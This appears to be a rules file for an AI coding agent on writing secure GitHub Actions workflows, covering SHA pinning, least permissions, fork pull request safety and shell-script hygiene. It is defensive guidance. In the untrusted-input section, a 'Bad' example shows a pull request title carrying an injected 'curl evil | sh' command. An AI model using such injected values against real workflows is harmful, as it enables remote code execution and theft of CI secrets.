---
name: github-actions
description: Rules for writing, changing or reviewing GitHub Actions workflows (.github/workflows/*.yml) in this open source repository. Covers SHA pinning, least permissions, timeouts, fork pull request safety, untrusted input, concurrency, and safe shell scripts. Use whenever you touch a workflow file.
---

# GitHub Actions

This is a public repository. Anyone can open a pull request from a fork. Write every workflow
so that code from a fork can never read a secret or push to the repository.

## Required

- **Pin every action to a full commit SHA, with the version as a comment.**

  ```yaml
  - uses: actions/checkout@<40-char-sha> # v5.0.1
  ```

  Tags and branches can move. Copy the SHA from another workflow in this repository when the
  same action is already used, or read it from the action's release page.
- **Set `permissions:` to the minimum.** Start with `contents: read` at the top of the file.
  Give more only to the job that needs it.
- **Set `timeout-minutes`** on every job.
- **Use `persist-credentials: false`** on `actions/checkout` unless a later step must run
  `git push`.

## Fork pull requests

- `pull_request` runs fork code **without** secrets. This is the safe default.
- `pull_request_target` runs **with** secrets and a write token. Never check out or run the pull
  request's code in such a workflow. Use it only for jobs that read metadata (labels,
  comments).
- A job that has secrets must not run code from the pull request. Put that code in a separate
  job without secrets.

## Untrusted input

Titles, branch names, bodies and comments are controlled by the author of the pull request. Do
not put `${{ github.event.* }}` directly into a `run:` script. Pass it through `env:`:

```yaml
# Bad: a title like  "; curl evil | sh  runs as a command.
- run: echo "${{ github.event.pull_request.title }}"

# Good
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

## Concurrency

Cancel old runs of the same branch, but do not let a pull request run cancel a push run:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true
```

## Checking out the base of a pull request

To compare with the base, check out `github.event.pull_request.base.sha`, not `base.ref`.
`base.ref` moves if the base branch gets new commits, and then you compare against a state that
never existed with this pull request.

## Shell scripts in steps

- `run:` uses `bash -e`. A failing command stops the step at once, so checking `$?` on the next
  line never happens. Use `if ! cmd; then ... fi`.
- Do not join commands with `&&` when you want to see every failure. Run all, then combine the
  exit codes: `a; s=$?; b; exit $((s || $?))`.
- Never read a result through a stage that can hide a failure (`| tail`, `| head`,
  `2>/dev/null`, `|| true`). Write output to a file, then read the file.
- Cut long text by lines (`head -n`), not by bytes (`head -c`), so multi-byte characters stay
  whole. Note that `head` can make the writer exit with code 141 (SIGPIPE) under `pipefail`.
- `curl`: set `--max-time`, use `--fail` (or `--fail-with-body` if you need the error body),
  and check that the response is valid JSON before you use it.
- Build JSON with `jq -n --arg`, not with `sed` replacements.
- Do not print a whole error response from an outside API. It can contain secrets. Print only
  the fields you need.

## A push made with `GITHUB_TOKEN` does not start other workflows

GitHub does not start `push` or `pull_request` workflows for commits or pull requests created
with `GITHUB_TOKEN`. If a bot pull request must run CI, use a GitHub App token instead.
